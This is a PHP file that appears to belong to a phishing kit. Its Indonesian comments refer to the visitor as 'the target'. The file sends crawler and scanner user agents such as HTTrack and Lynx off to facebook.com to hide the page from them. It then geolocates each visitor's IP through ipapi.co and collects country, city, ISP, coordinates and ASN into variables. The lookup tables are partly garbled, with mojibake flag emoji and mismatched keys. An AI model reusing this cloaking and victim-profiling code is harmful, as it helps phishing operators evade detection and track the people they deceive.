<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: https://www.facebook.com/');
die();
}


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$url = 'https://ipapi.co/json/'.get_client_ip();

//MEMPROSES DATA
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
$data = curl_exec($ch);
curl_close($ch);
//MENDAPATKAN DATA
$data = json_decode($data, TRUE);

$country_calling_code = '{ "BD": "880", "BE": "32", "BF": "226", "BG": "359", "BA": "387", "BB": "+1-246", "WF": "681", "BL": "590", "BM": "+1-441", "BN": "673", "BO": "591", "BH": "973", "BI": "257", "BJ": "229", "BT": "975", "JM": "+1-876", "BV": "", "BW": "267", "WS": "685", "BQ": "599", "BR": "55", "BS": "+1-242", "JE": "+44-1534", "BY": "375", "BZ": "501", "RU": "7", "RW": "250", "RS": "381", "TL": "670", "RE": "262", "TM": "993", "TJ": "992", "RO": "40", "TK": "690", "GW": "245", "GU": "+1-671", "GT": "502", "GS": "", "GR": "30", "GQ": "240", "GP": "590", "JP": "81", "GY": "592", "GG": "+44-1481", "GF": "594", "GE": "995", "GD": "+1-473", "GB": "44", "GA": "241", "SV": "503", "GN": "224", "GM": "220", "GL": "299", "GI": "350", "GH": "233", "OM": "968", "TN": "216", "JO": "962", "HR": "385", "HT": "509", "HU": "36", "HK": "852", "HN": "504", "HM": " ", "VE": "58", "PR": "+1-787 and 1-939", "PS": "970", "PW": "680", "PT": "351", "SJ": "47", "PY": "595", "IQ": "964", "PA": "507", "PF": "689", "PG": "675", "PE": "51", "PK": "92", "PH": "63", "PN": "870", "PL": "48", "PM": "508", "ZM": "260", "EH": "212", "EE": "372", "EG": "20", "ZA": "27", "EC": "593", "IT": "39", "VN": "84", "SB": "677", "ET": "251", "SO": "252", "ZW": "263", "SA": "966", "ES": "34", "ER": "291", "ME": "382", "MD": "373", "MG": "261", "MF": "590", "MA": "212", "MC": "377", "UZ": "998", "MM": "95", "ML": "223", "MO": "853", "MN": "976", "MH": "692", "MK": "389", "MU": "230", "MT": "356", "MW": "265", "MV": "960", "MQ": "596", "MP": "+1-670", "MS": "+1-664", "MR": "222", "IM": "+44-1624", "UG": "256", "TZ": "255", "MY": "60", "MX": "52", "IL": "972", "FR": "33", "IO": "246", "SH": "290", "FI": "358", "FJ": "679", "FK": "500", "FM": "691", "FO": "298", "NI": "505", "NL": "31", "NO": "47", "NA": "264", "VU": "678", "NC": "687", "NE": "227", "NF": "672", "NG": "234", "NZ": "64", "NP": "977", "NR": "674", "NU": "683", "CK": "682", "XK": "", "CI": "225", "CH": "41", "CO": "57", "CN": "86", "CM": "237", "CL": "56", "CC": "61", "CA": "1", "CG": "242", "CF": "236", "CD": "243", "CZ": "420", "CY": "357", "CX": "61", "CR": "506", "CW": "599", "CV": "238", "CU": "53", "SZ": "268", "SY": "963", "SX": "599", "KG": "996", "KE": "254", "SS": "211", "SR": "597", "KI": "686", "KH": "855", "KN": "+1-869", "KM": "269", "ST": "239", "SK": "421", "KR": "82", "SI": "386", "KP": "850", "KW": "965", "SN": "221", "SM": "378", "SL": "232", "SC": "248", "KZ": "7", "KY": "+1-345", "SG": "65", "SE": "46", "SD": "249", "DO": "+1-809 and 1-829", "DM": "+1-767", "DJ": "253", "DK": "45", "VG": "+1-284", "DE": "49", "YE": "967", "DZ": "213", "US": "1", "UY": "598", "YT": "262", "UM": "1", "LB": "961", "LC": "+1-758", "LA": "856", "TV": "688", "TW": "886", "TT": "+1-868", "TR": "90", "LK": "94", "LI": "423", "LV": "371", "TO": "676", "LT": "370", "LU": "352", "LR": "231", "LS": "266", "TH": "66", "TF": "", "TG": "228", "TD": "235", "TC": "+1-649", "LY": "218", "VA": "379", "VC": "+1-784", "AE": "971", "AD": "376", "AG": "+1-268", "AF": "93", "AI": "+1-264", "VI": "+1-340", "IS": "354", "IR": "98", "AM": "374", "AL": "355", "AO": "244", "AQ": "", "AS": "+1-684", "AR": "54", "AU": "61", "AT": "43", "AW": "297", "IN": "91", "AX": "+358-18", "AZ": "994", "IE": "353", "ID": "62", "UA": "380", "QA": "974", "MZ": "258" }';
$flags = array( "AC" => "ðŸ‡¦ðŸ‡¨", "AD" => "ðŸ‡¦ðŸ‡©", "AE" => "ðŸ‡¦ðŸ‡ª", "AF" => "ðŸ‡¦ðŸ‡«", "AG" => "ðŸ‡¦ðŸ‡¬", "AI" => "ðŸ‡¦ðŸ‡®", "AL" => "ðŸ‡¦ðŸ‡±", "AM" => "ðŸ‡¦ðŸ‡²", "AO" => "ðŸ‡¦ðŸ‡´", "AQ" => "ðŸ‡¦ðŸ‡¶", "AR" => "ðŸ‡¦ðŸ‡·", "AS" => "ðŸ‡¦ðŸ‡¸", "AT" => "ðŸ‡¦ðŸ‡¹", "AU" => "ðŸ‡¦ðŸ‡º", "AW" => "ðŸ‡¦ðŸ‡¼", "AX" => "ðŸ‡¦ðŸ‡½", "AZ" => "ðŸ‡¦ðŸ‡¿", "BA" => "ðŸ‡§ðŸ‡¦", "BB" => "ðŸ‡§ðŸ‡§", "BD" => "ðŸ‡§ðŸ‡©", "BE" => "ðŸ‡§ðŸ‡ª", "BF" => "ðŸ‡§ðŸ‡«", "BG" => "ðŸ‡§ðŸ‡¬", "BH" => "ðŸ‡§ðŸ‡­", "BI" => "ðŸ‡§ðŸ‡®", "BJ" => "ðŸ‡§ðŸ‡¯", "BL" => "ðŸ‡§ðŸ‡±", "BM" => "ðŸ‡§ðŸ‡²", "BN" => "ðŸ‡§ðŸ‡³", "BO" => "ðŸ‡§ðŸ‡´", "BQ" => "ðŸ‡§ðŸ‡¶", "BR" => "ðŸ‡§ðŸ‡·", "BS" => "ðŸ‡§ðŸ‡¸", "BT" => "ðŸ‡§ðŸ‡¹", "BV" => "ðŸ‡§ðŸ‡»", "BW" => "ðŸ‡§ðŸ‡¼", "BY" => "ðŸ‡§ðŸ‡¾", "BZ" => "ðŸ‡§ðŸ‡¿", "CA" => "ðŸ‡¨ðŸ‡¦", "CC" => "ðŸ‡¨ðŸ‡¨", "CD" => "ðŸ‡¨ðŸ‡©", "CF" => "ðŸ‡¨ðŸ‡«", "CG" => "ðŸ‡¨ðŸ‡¬", "CH" => "ðŸ‡¨ðŸ‡­", "CI" => "ðŸ‡¨ðŸ‡®", "CK" => "ðŸ‡¨ðŸ‡°", "CL" => "ðŸ‡¨ðŸ‡±", "CM" => "ðŸ‡¨ðŸ‡²", "CN" => "ðŸ‡¨ðŸ‡³", "CO" => "ðŸ‡¨ðŸ‡´", "CP" => "ðŸ‡¨ðŸ‡µ", "CR" => "ðŸ‡¨ðŸ‡·", "CU" => "ðŸ‡¨ðŸ‡º", "CV" => "ðŸ‡¨ðŸ‡»", "CW" => "ðŸ‡¨ðŸ‡¼", "CX" => "ðŸ‡¨ðŸ‡½", "CY" => "ðŸ‡¨ðŸ‡¾", "CZ" => "ðŸ‡¨ðŸ‡¿", "DE" => "ðŸ‡©ðŸ‡ª", "DG" => "ðŸ‡©ðŸ‡¬", "DJ" => "ðŸ‡©ðŸ‡¯", "DK" => "ðŸ‡©ðŸ‡°", "DM" => "ðŸ‡©ðŸ‡²", "DO" => "ðŸ‡©ðŸ‡´", "DZ" => "ðŸ‡©ðŸ‡¿", "EA" => "ðŸ‡ªðŸ‡¦", "EC" => "ðŸ‡ªðŸ‡¨", "EE" => "ðŸ‡ªðŸ‡ª", "EG" => "ðŸ‡ªðŸ‡¬", "EH" => "ðŸ‡ªðŸ‡­", "ER" => "ðŸ‡ªðŸ‡·", "ES" => "ðŸ‡ªðŸ‡¸", "ET" => "ðŸ‡ªðŸ‡¹", "EU" => "ðŸ‡ªðŸ‡º", "FI" => "ðŸ‡«ðŸ‡®", "FJ" => "ðŸ‡«ðŸ‡¯", "FK" => "ðŸ‡«ðŸ‡°", "FM" => "ðŸ‡«ðŸ‡²", "FO" => "ðŸ‡«ðŸ‡´", "FR" => "ðŸ‡«ðŸ‡·", "GA" => "ðŸ‡¬ðŸ‡¦", "GB" => "ðŸ‡¬ðŸ‡§", "GD" => "ðŸ‡¬ðŸ‡©", "GE" => "ðŸ‡¬ðŸ‡ª", "GF" => "ðŸ‡¬ðŸ‡«", "GG" => "ðŸ‡¬ðŸ‡¬", "GH" => "ðŸ‡¬ðŸ‡­", "GI" => "ðŸ‡¬ðŸ‡®", "GL" => "ðŸ‡¬ðŸ‡±", "GM" => "ðŸ‡¬ðŸ‡²", "GN" => "ðŸ‡¬ðŸ‡³", "GP" => "ðŸ‡¬ðŸ‡µ", "GQ" => "ðŸ‡¬ðŸ‡¶", "GR" => "ðŸ‡¬ðŸ‡·", "GS" => "ðŸ‡¬ðŸ‡¸", "GT" => "ðŸ‡¬ðŸ‡¹", "GU" => "ðŸ‡¬ðŸ‡º", "GW" => "ðŸ‡¬ðŸ‡¼", "GY" => "ðŸ‡¬ðŸ‡¾", "HK" => "ðŸ‡­ðŸ‡°", "HM" => "ðŸ‡­ðŸ‡²", "HN" => "ðŸ‡­ðŸ‡³", "HR" => "ðŸ‡­ðŸ‡·", "HT" => "ðŸ‡­ðŸ‡¹", "HU" => "ðŸ‡­ðŸ‡º", "IC" => "ðŸ‡®ðŸ‡¨", "ID" => "ðŸ‡®ðŸ‡©", "IE" => "ðŸ‡®ðŸ‡ª", "IL" => "ðŸ‡®ðŸ‡±", "IM" => "ðŸ‡®ðŸ‡²", "IN" => "ðŸ‡®ðŸ‡³", "IO" => "ðŸ‡®ðŸ‡´", "IQ" => "ðŸ‡®ðŸ‡¶", "IR" => "ðŸ‡®ðŸ‡·", "IS" => "ðŸ‡®ðŸ‡¸", "IT" => "ðŸ‡®ðŸ‡¹", "JE" => "ðŸ‡¯ðŸ‡ª", "JM" => "ðŸ‡¯ðŸ‡²", "JO" => "ðŸ‡¯ðŸ‡´", "JP" => "ðŸ‡¯ðŸ‡µ", "KE" => "ðŸ‡°ðŸ‡ª", "KG" => "ðŸ‡°ðŸ‡¬", "KH" => "ðŸ‡°ðŸ‡­", "KI" => "ðŸ‡°ðŸ‡®", "KM" => "ðŸ‡°ðŸ‡²", "KN" => "ðŸ‡°ðŸ‡³", "KP" => "ðŸ‡°ðŸ‡µ", "KR" => "ðŸ‡°ðŸ‡·", "KW" => "ðŸ‡°ðŸ‡¼", "KY" => "ðŸ‡°ðŸ‡¾", "KZ" => "ðŸ‡°ðŸ‡¿", "LA" => "ðŸ‡±ðŸ‡¦", "LB" => "ðŸ‡±ðŸ‡§", "LC" => "ðŸ‡±ðŸ‡¨", "LI" => "ðŸ‡±ðŸ‡®", "LK" => "ðŸ‡±ðŸ‡°", "LR" => "ðŸ‡±ðŸ‡·", "LS" => "ðŸ‡±ðŸ‡¸", "LT" => "ðŸ‡±ðŸ‡¹", "LU" => "ðŸ‡±ðŸ‡º", "LV" => "ðŸ‡±ðŸ‡»", "LY" => "ðŸ‡±ðŸ‡¾", "MA" => "ðŸ‡²ðŸ‡¦", "MC" => "ðŸ‡²ðŸ‡¨", "MD" => "ðŸ‡²ðŸ‡©", "ME" => "ðŸ‡²ðŸ‡ª", "MF" => "ðŸ‡²ðŸ‡«", "MG" => "ðŸ‡²ðŸ‡¬", "MH" => "ðŸ‡²ðŸ‡­", "MK" => "ðŸ‡²ðŸ‡°", "ML" => "ðŸ‡²ðŸ‡±", "MM" => "ðŸ‡²ðŸ‡²", "MN" => "ðŸ‡²ðŸ‡³", "MO" => "ðŸ‡²ðŸ‡´", "MP" => "ðŸ‡²ðŸ‡µ", "MQ" => "ðŸ‡²ðŸ‡¶", "MR" => "ðŸ‡²ðŸ‡·", "MS" => "ðŸ‡²ðŸ‡¸", "MT" => "ðŸ‡²ðŸ‡¹", "MU" => "ðŸ‡²ðŸ‡º", "MV" => "ðŸ‡²ðŸ‡»", "MW" => "ðŸ‡²ðŸ‡¼", "MX" => "ðŸ‡²ðŸ‡½", "MY" => "ðŸ‡²ðŸ‡¾", "MZ" => "ðŸ‡²ðŸ‡¿", "NS" => "ðŸ‡³ðŸ‡¦", "NC" => "ðŸ‡³ðŸ‡¨", "NE" => "ðŸ‡³ðŸ‡ª", "NF" => "ðŸ‡³ðŸ‡«", "NG" => "ðŸ‡³ðŸ‡¬", "NI" => "ðŸ‡³ðŸ‡®", "NL" => "ðŸ‡³ðŸ‡±", "NO" => "ðŸ‡³ðŸ‡´", "NP" => "ðŸ‡³ðŸ‡µ", "NR" => "ðŸ‡³ðŸ‡·", "NU" => "ðŸ‡³ðŸ‡º", "NZ" => "ðŸ‡³ðŸ‡¿", "OM" => "ðŸ‡´ðŸ‡²", "PA" => "ðŸ‡µðŸ‡¦", "PE" => "ðŸ‡µðŸ‡ª", "PF" => "ðŸ‡µðŸ‡«", "PG" => "ðŸ‡µðŸ‡¬", "PH" => "ðŸ‡µðŸ‡­", "PK" => "ðŸ‡µðŸ‡°", "PL" => "ðŸ‡µðŸ‡±", "PM" => "ðŸ‡µðŸ‡²", "PN" => "ðŸ‡µðŸ‡³", "PR" => "ðŸ‡µðŸ‡·", "PS" => "ðŸ‡µðŸ‡¸", "PT" => "ðŸ‡µðŸ‡¹", "PW" => "ðŸ‡µðŸ‡¼", "PY" => "ðŸ‡µðŸ‡¾", "QA" => "ðŸ‡¶ðŸ‡¦", "RE" => "ðŸ‡·ðŸ‡ª", "RO" => "ðŸ‡·ðŸ‡´", "RU" => "ðŸ‡·ðŸ‡º", "RW" => "ðŸ‡·ðŸ‡¼", "SA" => "ðŸ‡¸ðŸ‡¦", "SB" => "ðŸ‡¸ðŸ‡§", "SC" => "ðŸ‡¸ðŸ‡¨", "SD" => "ðŸ‡¸ðŸ‡©", "SE" => "ðŸ‡¸ðŸ‡ª", "SG" => "ðŸ‡¸ðŸ‡¬", "SH" => "ðŸ‡¸ðŸ‡­", "SI" => "ðŸ‡¸ðŸ‡®", "SJ" => "ðŸ‡¸ðŸ‡¯", "SK" => "ðŸ‡¸ðŸ‡°", "SL" => "ðŸ‡¸ðŸ‡±", "SM" => "ðŸ‡¸ðŸ‡²", "SN" => "ðŸ‡¸ðŸ‡³", "SO" => "ðŸ‡¸ðŸ‡´", "SR" => "ðŸ‡¸ðŸ‡·", "SS" => "ðŸ‡¸ðŸ‡¸", "ST" => "ðŸ‡¸ðŸ‡¹", "SV" => "ðŸ‡¸ðŸ‡»", "SX" => "ðŸ‡¸ðŸ‡½", "SY" => "ðŸ‡¸ðŸ‡¾", "SZ" => "ðŸ‡¸ðŸ‡¿", "TA" => "ðŸ‡¹ðŸ‡¦", "TC" => "ðŸ‡¹ðŸ‡¨", "TD" => "ðŸ‡¹ðŸ‡©", "TF" => "ðŸ‡¹ðŸ‡«", "TG" => "ðŸ‡¹ðŸ‡¬", "TH" => "ðŸ‡¹ðŸ‡­", "TJ" => "ðŸ‡¹ðŸ‡¯", "TK" => "ðŸ‡¹ðŸ‡°", "TL" => "ðŸ‡¹ðŸ‡±", "TM" => "ðŸ‡¹ðŸ‡²", "TN" => "ðŸ‡¹ðŸ‡³", "TO" => "ðŸ‡¹ðŸ‡´", "TR" => "ðŸ‡¹ðŸ‡·", "TT" => "ðŸ‡¹ðŸ‡¹", "TV" => "ðŸ‡¹ðŸ‡»", "TW" => "ðŸ‡¹ðŸ‡¼", "TZ" => "ðŸ‡¹ðŸ‡¿", "US" => "ðŸ‡ºðŸ‡¦", "UG" => "ðŸ‡ºðŸ‡¬", "UM" => "ðŸ‡ºðŸ‡²", "UN" => "ðŸ‡ºðŸ‡³", "US" => "ðŸ‡ºðŸ‡¸", "UY" => "ðŸ‡ºðŸ‡¾", "UZ" => "ðŸ‡ºðŸ‡¿", "VA" => "ðŸ‡»ðŸ‡¦", "VC" => "ðŸ‡»ðŸ‡¨", "VE" => "ðŸ‡»ðŸ‡ª", "VG" => "ðŸ‡»ðŸ‡¬", "VI" => "ðŸ‡»ðŸ‡®", "VN" => "ðŸ‡»ðŸ‡³", "VU" => "ðŸ‡»ðŸ‡º",
                "WF" => "ðŸ‡¼ðŸ‡«", "WS" => "ðŸ‡¼ðŸ‡¸", "XK" => "ðŸ‡½ðŸ‡°", "YE" => "ðŸ‡¾ðŸ‡ª", "YT" => "ðŸ‡¾ðŸ‡¹", "ZA" => "ðŸ‡¿ðŸ‡¦", "ZM" => "ðŸ‡¿ðŸ‡²", "ZW" => "ðŸ‡¿ðŸ‡¼");
$putCalling = json_decode($country_calling_code, true);
$country_calling_code = $data['country_calling_code'];

// HASIL PELACAKAN ALAMAT IP PRIBADI SI TARGET
$putra_ip = get_client_ip();
$putra_bendera = $flags[$country_calling_code];
$putra_nomor = "+".$putCalling[$country_calling_code];
$putra_negara = $data['country'];
$putra_daerah = $data['region'];
$putra_kota = $data['city'];
$putra_sinyal = $data['org'];
$putra_lat = $data['latitude'];
$putra_lon = $data['longitude'];
$putra_asn = $data['asn'];
?>
